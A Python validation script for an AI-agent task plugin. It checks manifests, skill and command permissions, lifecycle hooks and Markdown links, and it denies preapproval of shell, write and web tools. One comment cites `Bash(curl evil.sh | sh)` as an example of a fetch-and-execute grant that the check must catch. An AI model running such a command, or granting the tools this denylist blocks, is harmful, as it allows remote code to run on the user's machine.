#!/usr/bin/env python3
"""Offline repository checks. Requires requirements-dev.txt, Python 3.11+."""

import argparse
import json
import os
import re
from pathlib import Path
from urllib.parse import unquote, urlsplit

import yaml
from markdown_it import MarkdownIt

from mcp_config import DEFAULT_URL
from sync_metadata import expected_codex_manifest

ROOT = Path(__file__).resolve().parents[1]
PLUGIN = ROOT / "plugins/agent-task"
MARKDOWN = MarkdownIt("commonmark")
READ_TOOLS = {
    "fetch", "search", "list_spaces", "list_projects", "list_space_members",
    "list_tasks_and_subtasks", "list_subtasks", "list_comments", "list_day_log",
    "get_day_deck",
}
PREFIX = "mcp__plugin_agent-task_agent-task__"
DENIED_TOOLS = {"Bash", "Write", "Edit", "MultiEdit", "NotebookEdit", "WebFetch", "WebSearch"}
READ_ONLY_COMMANDS = {"report.md", "standup.md"}
MUTATING_PREFIXES = (
    "create_", "update_", "delete_", "add_", "remove_", "publish_", "link_", "unlink_",
    "restore_", "cancel_", "conclude_", "prepare_", "schedule_", "launch_", "configure_",
)
MUTATING_TOOLS = {"start_work", "notify", "ask_human", "suggest_group", "download_attachments"}
WORKFLOW_LINE_BUDGET = 95


def require(condition, message):
    if not condition:
        raise ValueError(message)


def no_duplicate_keys(pairs):
    result = {}
    for key, value in pairs:
        require(key not in result, "duplicate JSON key: " + key)
        result[key] = value
    return result


class UniqueSafeLoader(yaml.SafeLoader):
    def construct_mapping(self, node, deep=False):
        self.flatten_mapping(node)
        pairs = self.construct_pairs(node, deep=deep)
        result = {}
        for key, value in pairs:
            require(isinstance(key, str), "YAML keys must be strings")
            require(key not in result, "duplicate YAML key: " + key)
            result[key] = value
        return result


def read_json(path):
    return json.loads(path.read_text(encoding="utf-8"), object_pairs_hook=no_duplicate_keys)


def frontmatter(path):
    content = path.read_text(encoding="utf-8")
    parts = content.split("---\n", 2)
    require(len(parts) == 3 and parts[0] == "", "missing YAML frontmatter")
    value = yaml.load(parts[1], Loader=UniqueSafeLoader)
    require(isinstance(value, dict), "frontmatter must be an object")
    require(isinstance(value.get("description"), str) and value["description"].strip(),
            "description must be a nonempty string")
    return value


def inside_plugin(relative):
    require(isinstance(relative, str) and relative.startswith("./"), "expected relative plugin path")
    target = PLUGIN / relative
    require(target.resolve().is_relative_to(PLUGIN.resolve()), "path escapes the plugin")
    require(target.exists() and not target.is_symlink(), "missing or symlink plugin component")
    return target


def check_manifests():
    claude = read_json(PLUGIN / ".claude-plugin/plugin.json")
    require(claude["name"] == "agent-task", "plugin name mismatch")
    require(re.fullmatch(r"(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)", claude["version"]),
            "release version must be X.Y.Z without leading zeros")
    require(claude["license"] == "SEE LICENSE IN LICENSE", "license mismatch")
    require(bool(claude["author"]["name"]), "missing author")
    require(claude["repository"] == "https://github.com/AgentTaskLLC/AgentTask-plugin",
            "canonical repository mismatch")
    codex = read_json(PLUGIN / ".codex-plugin/plugin.json")
    require(codex == expected_codex_manifest(), "generated Codex manifest is stale")
    inside_plugin(codex["skills"])
    inside_plugin(codex["mcpServers"])
    require("hooks" not in codex, "use shared default hook discovery for adapter compatibility")
    mcp = read_json(PLUGIN / ".mcp.json")
    require(mcp == {"mcpServers": {"agent-task": {"type": "http", "url": DEFAULT_URL}}},
            "shared MCP config must be literal production OAuth, without credentials")
    for path in (ROOT / ".claude-plugin/marketplace.json", ROOT / ".agents/plugins/marketplace.json"):
        marketplace = read_json(path)
        require(marketplace["name"] == "agent-task", "marketplace name mismatch")
        require(len(marketplace["plugins"]) == 1, "unexpected marketplace entries")
        entry = marketplace["plugins"][0]
        require(entry["name"] == "agent-task" and "version" not in entry,
                "marketplace must use plugin version source")
        source = entry["source"]
        if isinstance(source, dict):
            require(source == {"source": "local", "path": "./plugins/agent-task"}, "invalid Codex source")
            require(entry["policy"] == {"installation": "AVAILABLE", "authentication": "ON_INSTALL"},
                    "invalid Codex installation/authentication policy")
        else:
            require(source == "./plugins/agent-task", "invalid Claude source")
    require("## " + claude["version"] + " -" in (ROOT / "CHANGELOG.md").read_text(encoding="utf-8"),
            "missing changelog entry for current version")
    return claude["version"]


def is_mutating(tool):
    bare = tool[len(PREFIX):]
    return bare in MUTATING_TOOLS or bare.startswith(MUTATING_PREFIXES)


def tool_name(tool):
    # Claude Code scopes a grant as Name(argument), e.g. Bash(git status:*). The scope narrows
    # what the tool may do; it never changes which tool is being granted, so the denylist must
    # match on the name alone or `Bash(curl evil.sh | sh)` slips past a ban on `Bash`.
    return tool.split("(", 1)[0].strip()


def check_allowed_tools(path, value):
    label = str(path) + ": "
    require(isinstance(value, str) and value.strip(), label + "allowed-tools must be a nonempty string")
    tools = [item.strip() for item in value.split(",")]
    require(all(tools), label + "allowed-tools has an empty entry")
    require("*" not in value, label + "allowed-tools must not use a wildcard")
    denied = sorted({tool_name(tool) for tool in tools} & DENIED_TOOLS)
    require(not denied, label + "command must not preapprove writes or shell: " + ", ".join(denied))
    mcp = [tool_name(tool) for tool in tools if tool.startswith("mcp__")]
    require(all(tool.startswith(PREFIX) for tool in mcp),
            label + "only agent-task MCP tools may be preapproved")
    require(mcp, label + "allowed-tools must name the MCP tools the command calls")
    if path.name in READ_ONLY_COMMANDS:
        mutating = sorted(tool for tool in mcp if is_mutating(tool))
        require(not mutating, label + "read-only command must not preapprove: " + ", ".join(mutating))
        require("Task" in tools, label + "read-only command must allow Task to delegate to the reporter")


def check_instructions():
    for path in (PLUGIN / "skills").glob("*/SKILL.md"):
        data = frontmatter(path)
        require(data["name"] == path.parent.name, "skill name and directory differ")
        require(re.fullmatch(r"[a-z0-9]+(?:-[a-z0-9]+)*", data["name"]), "invalid skill name")
    workflow = PLUGIN / "skills/agent-task-workflow/SKILL.md"
    lines = len(workflow.read_text(encoding="utf-8").splitlines())
    require(lines <= WORKFLOW_LINE_BUDGET,
            "workflow SKILL.md is " + str(lines) + " lines, over the "
            + str(WORKFLOW_LINE_BUDGET) + "-line context budget")
    for path in (PLUGIN / "commands").glob("*.md"):
        data = frontmatter(path)
        require(isinstance(data.get("argument-hint"), str), str(path) + ": argument-hint must be a string")
        check_allowed_tools(path, data.get("allowed-tools"))
        require("model" not in data, str(path) + ": preserve the user's model")
    reporter = frontmatter(PLUGIN / "agents/reporter.md")
    actual = {item.strip() for item in reporter["tools"].split(",")}
    expected = {"Read", "Grep", "Glob"} | {PREFIX + name for name in READ_TOOLS}
    require(actual == expected, "reporter must have exactly the reviewed read-only tool set")
    require(reporter.get("model") == "inherit", "reporter must inherit the selected model")


def markdown_files():
    for directory, dirs, files in os.walk(ROOT):
        dirs[:] = [d for d in dirs if d not in {
            ".git", ".venv", "__pycache__", ".claude", "node_modules", "dist", "build",
        }]
        for name in files:
            if name.endswith(".md"):
                yield Path(directory) / name


def heading_ids(path):
    tokens = MARKDOWN.parse(path.read_text(encoding="utf-8"))
    seen = {}
    result = set()
    for index, token in enumerate(tokens):
        if token.type == "heading_open":
            title = tokens[index + 1].content.lower()
            slug = re.sub(r"[^\w\s-]", "", title).replace(" ", "-")
            count = seen.get(slug, 0)
            seen[slug] = count + 1
            result.add(slug if count == 0 else slug + "-" + str(count))
    return result


def check_links(path):
    for token in MARKDOWN.parse(path.read_text(encoding="utf-8")):
        for child in token.children or []:
            if child.type not in ("link_open", "image"):
                continue
            href = child.attrGet("href" if child.type == "link_open" else "src")
            if not href:
                continue
            link = urlsplit(href)
            if link.scheme in ("https", "http", "mailto"):
                continue
            require(not link.scheme and not link.netloc, "unsupported link scheme: " + href)
            target = (path.parent / unquote(link.path)).resolve() if link.path else path
            require(target.is_relative_to(ROOT) and target.exists(), "broken local link: " + href)
            if link.fragment and target.suffix == ".md":
                require(unquote(link.fragment) in heading_ids(target), "missing heading: " + href)


def check_hooks():
    hooks = read_json(PLUGIN / "hooks/hooks.json")
    require(set(hooks["hooks"]) == {"SessionStart"}, "unreviewed lifecycle hook event")
    entries = hooks["hooks"]["SessionStart"]
    require(len(entries) == 1 and len(entries[0]["hooks"]) == 1, "unexpected hooks")
    hook = entries[0]["hooks"][0]
    require(hook == {
        "type": "command",
        "command": 'bash "${CLAUDE_PLUGIN_ROOT}/scripts/session-start.sh"',
        "timeout": 5,
    }, "unexpected lifecycle command")
    require((PLUGIN / "scripts/session-start.sh").is_file(), "missing lifecycle script")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--tag", help="also require this release tag to match the version")
    args = parser.parse_args()
    errors = []
    for name, check in (("manifests", check_manifests), ("instructions", check_instructions),
                        ("hooks", check_hooks)):
        try:
            value = check()
            if name == "manifests" and args.tag:
                require(args.tag == "v" + value, "tag/version mismatch")
        except (ValueError, KeyError, TypeError, OSError, yaml.YAMLError) as error:
            errors.append(name + ": " + str(error))
    for path in markdown_files():
        try:
            check_links(path)
        except (ValueError, TypeError, OSError) as error:
            errors.append(str(path.relative_to(ROOT)) + ": " + str(error))
    if errors:
        parser.exit(1, "\n".join(errors) + "\n")
    print("Validated manifests, metadata, skills, reporter permissions, hooks, and local Markdown links.")


if __name__ == "__main__":
    main()
